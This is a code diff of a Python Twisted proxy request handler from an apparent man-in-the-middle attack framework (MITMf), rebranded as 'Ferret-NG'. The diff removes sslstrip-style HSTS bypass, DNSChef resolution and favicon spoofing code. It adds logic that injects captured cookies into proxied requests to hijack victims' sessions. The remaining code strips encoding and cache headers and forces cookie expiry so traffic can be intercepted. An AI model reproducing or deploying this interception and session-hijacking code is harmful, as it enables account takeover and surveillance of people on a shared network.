@@ -21,8 +21,7 @@ import logging
 import os 
 import sys 
 import random
-import re 
-import dns.resolver
+import re
 
 from twisted.web.http import Request
 from twisted.web.http import HTTPChannel
@@ -54,44 +53,27 @@ class ClientRequest(Request):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
         self.urlMonitor    = URLMonitor.getInstance()
-        self.hsts          = URLMonitor.getInstance().hsts
         self.cookieCleaner = CookieCleaner.getInstance()
         self.dnsCache      = DnsCache.getInstance()
         #self.uniqueId      = random.randint(0, 10000)
-        
-        #Use are own DNS server instead of reactor.resolve()
-        self.customResolver = dns.resolver.Resolver()    
-        self.customResolver.nameservers  = ['127.0.0.1']
 
     def cleanHeaders(self):
         headers = self.getAllHeaders().copy()
 
-        if self.hsts:
-
-            if 'referer' in headers:
-                real = self.urlMonitor.getHstsConfig()[0]
-                if len(real) > 0:
-                    dregex = re.compile("({})".format("|".join(map(re.escape, real.keys()))))
-                    headers['referer'] = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), headers['referer'])
-
-            if 'if-none-match' in headers:
-                del headers['if-none-match']
-
-            if 'host' in headers:
-                host = self.urlMonitor.URLgetRealHost(str(headers['host']))
-                mitmf_logger.debug("[ClientRequest][HSTS] Modifing HOST header: {} -> {}".format(headers['host'], host))
-                headers['host'] = host
-                self.setHeader('Host', host)
-
         if 'accept-encoding' in headers:
              del headers['accept-encoding']
-             mitmf_logger.debug("[ClientRequest] Zapped encoding")
+             mitmf_logger.debug("[Ferret-NG] [ClientRequest] Zapped encoding")
 
         if 'if-modified-since' in headers:
             del headers['if-modified-since']
 
         if 'cache-control' in headers:
             del headers['cache-control']
+
+        if 'host' in headers:
+            if headers['host'] in self.urlMonitor.cookies:
+                mitmf_logger.info("[Ferret-NG] Hijacking session for host: {}".format(headers['host']))
+                headers['cookie'] = self.urlMonitor.cookies[headers['host']]
 
         return headers
 
@@ -100,21 +82,10 @@ class ClientRequest(Request):
             index = self.uri.find('/', 7)
             return self.uri[index:]
 
-        return self.uri        
-
-    def getPathToLockIcon(self):
-        if os.path.exists("lock.ico"): return "lock.ico"
-
-        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
-        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")
-
-        if os.path.exists(scriptPath): return scriptPath
-
-        mitmf_logger.warning("[ClientRequest] Error: Could not find lock.ico")
-        return "lock.ico"        
+        return self.uri   
 
     def handleHostResolvedSuccess(self, address):
-        mitmf_logger.debug("[ClientRequest] Resolved host successfully: {} -> {}".format(self.getHeader('host'), address))
+        mitmf_logger.debug("[Ferret-NG] [ClientRequest] Resolved host successfully: {} -> {}".format(self.getHeader('host'), address))
         host              = self.getHeader("host")
         headers           = self.cleanHeaders()
         client            = self.getClientIP()
@@ -125,49 +96,24 @@ class ClientRequest(Request):
         if self.content:
             self.content.seek(0,0)
         
-        postData          = self.content.read()
+        postData = self.content.read()
 
-        if self.hsts:
-
-            host      = self.urlMonitor.URLgetRealHost(str(host))
-            real      = self.urlMonitor.getHstsConfig()[0]
-            patchDict = self.urlMonitor.patchDict
-            url       = 'http://' + host + path
-            self.uri  = url # set URI to absolute
-
-            if real:
-                dregex = re.compile("({})".format("|".join(map(re.escape, real.keys()))))
-                path = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), path)
-                postData = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), postData)
-                
-                if patchDict:
-                    dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
-                    postData = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), postData)
-
-            
-            headers['content-length'] = str(len(postData))
-
-        #self.dnsCache.cacheResolution(host, address)
         hostparts = host.split(':')
         self.dnsCache.cacheResolution(hostparts[0], address)
 
         if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
-            mitmf_logger.debug("[ClientRequest] Sending expired cookies")
+            mitmf_logger.debug("[Ferret-NG] [ClientRequest] Sending expired cookies")
             self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client, host, headers, path))
-        
-        elif (self.urlMonitor.isSecureFavicon(client, path)):
-            mitmf_logger.debug("[ClientRequest] Sending spoofed favicon response")
-            self.sendSpoofedFaviconResponse()
 
         elif (self.urlMonitor.isSecureLink(client, url) or ('securelink' in headers)):
             if 'securelink' in headers:
                 del headers['securelink']
             
-            mitmf_logger.debug("[ClientRequest] Sending request via SSL ({})".format((client,url)))
+            mitmf_logger.debug("[Ferret-NG] [ClientRequest] Sending request via SSL ({})".format((client,url)))
             self.proxyViaSSL(address, self.method, path, postData, headers, self.urlMonitor.getSecurePort(client, url))
         
         else:
-            mitmf_logger.debug("[ClientRequest] Sending request via HTTP")
+            mitmf_logger.debug("[Ferret-NG] [ClientRequest] Sending request via HTTP")
             #self.proxyViaHTTP(address, self.method, path, postData, headers)
             port = 80
             if len(hostparts) > 1:
@@ -176,7 +122,7 @@ class ClientRequest(Request):
             self.proxyViaHTTP(address, self.method, path, postData, headers, port)
 
     def handleHostResolvedError(self, error):
-        mitmf_logger.debug("[ClientRequest] Host resolution error: {}".format(error))
+        mitmf_logger.debug("[Ferret-NG] [ClientRequest] Host resolution error: {}".format(error))
         try:
             self.finish()
         except:
@@ -186,27 +132,14 @@ class ClientRequest(Request):
         address = self.dnsCache.getCachedAddress(host)
 
         if address != None:
-            mitmf_logger.debug("[ClientRequest] Host cached: {} {}".format(host, address))
+            mitmf_logger.debug("[Ferret-NG] [ClientRequest] Host cached: {} {}".format(host, address))
             return defer.succeed(address)
         else:
-            
-            mitmf_logger.debug("[ClientRequest] Host not cached.")
-            self.customResolver.port = self.urlMonitor.getResolverPort()
-
-            try:
-                mitmf_logger.debug("[ClientRequest] Resolving with DNSChef")
-                address = str(self.customResolver.query(host)[0].address)
-                return defer.succeed(address)
-            except Exception:
-                mitmf_logger.debug("[ClientRequest] Exception occured, falling back to Twisted")
-                return reactor.resolve(host)
+            return reactor.resolve(host)
 
     def process(self):
-        mitmf_logger.debug("[ClientRequest] Resolving host: {}".format(self.getHeader('host')))
-        host = self.getHeader('host').split(":")[0]
-
-        if self.hsts:
-            host = self.urlMonitor.URLgetRealHost(str(host))                
+        mitmf_logger.debug("[Ferret-NG] [ClientRequest] Resolving host: {}".format(self.getHeader('host')))
+        host = self.getHeader('host').split(":")[0]              
 
         deferred = self.resolveHost(host)
         deferred.addCallback(self.handleHostResolvedSuccess)
@@ -233,13 +166,3 @@ class ClientRequest(Request):
             self.setHeader("Set-Cookie", header)
 
         self.finish()        
-        
-    def sendSpoofedFaviconResponse(self):
-        icoFile = open(self.getPathToLockIcon())
-
-        self.setResponseCode(200, "OK")
-        self.setHeader("Content-type", "image/x-icon")
-        self.write(icoFile.read())
-                
-        icoFile.close()
-        self.finish()
